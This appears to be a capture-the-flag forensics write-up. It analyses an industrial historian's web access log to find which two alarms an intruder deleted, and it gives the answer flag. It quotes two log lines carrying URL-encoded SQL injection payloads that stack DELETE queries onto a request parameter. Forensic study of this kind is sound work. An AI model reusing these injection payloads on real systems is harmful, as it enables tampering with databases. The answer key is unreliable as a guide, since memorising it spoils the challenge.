# The Historian Channel - 3
Category: Jubilife

## Description
The downloaded configuration file contained database schemas as well as information regarding the various alarms in Jubilife’s ICS network. It also contained hardcoded passwords, which could explain how the unauthorized user was eventually able to login successfully.

There is no evidence that this configuration file has been changed in any way, which means the user must have found a different way to modify the alarm logging. However, the configuration file was probably used as part of their information gathering process.

Looking deeper into the suspicious user’s activities, what are the names of the two alarms they deleted from the database?

*Flag format: alarm names in ASCII, comma separated (order does not matter). Example: if alarms with names ABCD and EFGH were deleted from database, accepted flags would be **ABCD,EFGH** or **EFGH,ABCD**.*

Attachments: [access.log](attachments/access.log)

## Write-up
- Based on the information obtained in [The Historian Channel - 1](../jubilife-the-historian-channel-1/README.md), the last successful login occurred at `04/May/2023:12:22:50`.
- Therefore, it is likely that the modification to the alarm logging occurred after that timestamp.
- During our analysis, we discovered several `GET` requests made to `/alarms.php` at different time intervals. These requests included query values that resembled `SQL DELETE` queries.
- Among all the queries, only two of them resulted in a status code of `200`, while the rest returned a status code of `500`.
- The requests are as follows:
```
192.168.4.146 - - [04/May/2023:13:17:50 -0500] "GET /alarms.php/?deviceID=1%27%3BDELETE%20FROM%20alarms%20WHERE%20deviceID%20=%20CAST(%275%27%20as%20INTEGER)%20AND%20name%20=%20CAST(X%2742313237%27%20as%20TEXT)%3B--&Submit=Submit HTTP/1.1" 200 1299 "http://jubilifehistorian/alarms.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36"
192.168.4.146 - - [04/May/2023:13:18:05 -0500] "GET /alarms.php/?deviceID=1%27%3BDELETE%20FROM%20alarms%20WHERE%20deviceID%20=%20CAST(%275%27%20as%20INTEGER)%20AND%20name%20=%20CAST(X%2743393639%27%20as%20TEXT)%3B--&Submit=Submit HTTP/1.1" 200 1295 "http://jubilifehistorian/alarms.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36"
```
- The first SQL query indicates the name to be the expression `CAST(X'42313237' as TEXT)` which translates `B127`.
- The second SQL query indicates the name to be expression`CAST(X'43393639' as TEXT)` which translates `C969`.

Flag: `B127,C969`
